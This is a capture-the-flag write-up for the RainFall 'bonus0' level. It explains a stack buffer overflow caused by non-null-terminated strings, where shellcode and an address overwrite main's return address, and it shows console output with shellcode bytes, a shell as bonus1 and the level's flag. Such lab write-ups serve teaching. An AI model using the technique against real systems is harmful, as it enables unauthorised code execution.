## bonus0

We want to get a stack buffer overflow to overwrite the return address of `main` and jump to a shellcode.

```c
int main() {
    char buf[42];

    pp(buf);
    puts(buf);
    return 0;
}
```

We thus wants to puts more than 42 characters in the buffer, let's look at the `pp` function:

```c
void pp(char* dest) {
    char s1[20];
    char s2[20];

    p(s1, " - ");
    p(s2, " - ");
    strcpy(dest, s1);

    size_t len = strlen(dest);
    dest[len] = ' ';
    dest[len + 1] = '\0';
    strcat(dest, s2);
}
```

We see that a function called `p` is used to set the buffers `s1` and `s2`.
Let's look at it.

```c
void p(char* dest, char* s) {
    char buf[4096];

    puts(s);
    read(STDIN_FILENO, buf, 4096);
    *strchr(buf, '\n') = '\0';
    strncpy(dest, buf, 20);
}
```

We see that we can put 20 arbitrary bytes into `buf`.
Meaning we can have a non-null terminated `s1` or `s2`, by setting them to 20 non-null bytes.

By having a non-null terminated `s1`:
- The call to `strcpy` will copy `s1` to `dest`, then `s2` to `dest` (`s1` and `s2` are continous on the stack)
- Then, `dest` will be concatenated with `s2`

`dest` will therefore looks like this at the end of `pp`:
```
[s1 (20 bytes)][s2 (at most 19 bytes)][s2 (at most 19 bytes)]
```

By putting a 23 bytes shellcode in (`s1` + `s2`), and the address of the `dest` buffer somewhere in `s2`, we can overwrite the return address of `main` to jump to our shellcode.

With the shell given by our shellcode, we then retrieve the flag.

```console
bonus0@RainFall:~$ bash /tmp/bonus0.sh
 - 
 - 
1�P
   h//shh/bin��1�1�̀AAAAAAAAAAA&���A �̀AAAAAAAAAAA&���A
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```